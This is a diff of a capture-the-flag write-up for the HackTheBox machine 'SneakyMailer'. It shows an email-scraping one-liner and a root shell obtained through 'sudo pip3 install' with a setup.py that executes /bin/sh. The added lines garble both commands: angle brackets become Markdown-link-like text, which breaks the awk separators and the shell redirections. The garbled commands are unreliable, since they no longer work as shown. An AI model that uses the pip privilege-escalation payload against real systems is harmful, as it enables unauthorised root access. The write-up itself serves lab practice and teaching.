@@ -120,7 +120,7 @@ Since we found lot of emails from `team.php` I created the wordlist of it
 
 ```bash
 curl http://sneakycorp.htb/team.php -o team.php
-****c**at team.php | grep @sneakymailer.htb | awk -F"<td>" '{print $2}' | awk -F"</td>" '{print $1}' > mail.txt**
+****c**at team.php | grep @sneakymailer.htb | awk -F"[td](td)" '{print $2}' | awk -F"[/td](/td)" '{print $1}' > mail.txt**
 ```
 
 I decided to send them mails, for that we can use `telnet` too but I want to automate the stuff, so I created a quick bash script. Using `swaks` tool I gonna do this.
@@ -357,7 +357,7 @@ By following that, It spawn shell as root
 
 ```bash
 low@sneakymailer:~$ TF=$(mktemp -d)
-low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh [$(tty) ]($(tty) )$(tty) 2>$(tty)')" > $TF/setup.py
 low@sneakymailer:~$ sudo pip3 install $TF
 sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
 Processing /tmp/tmp.PrKnMj0dSd
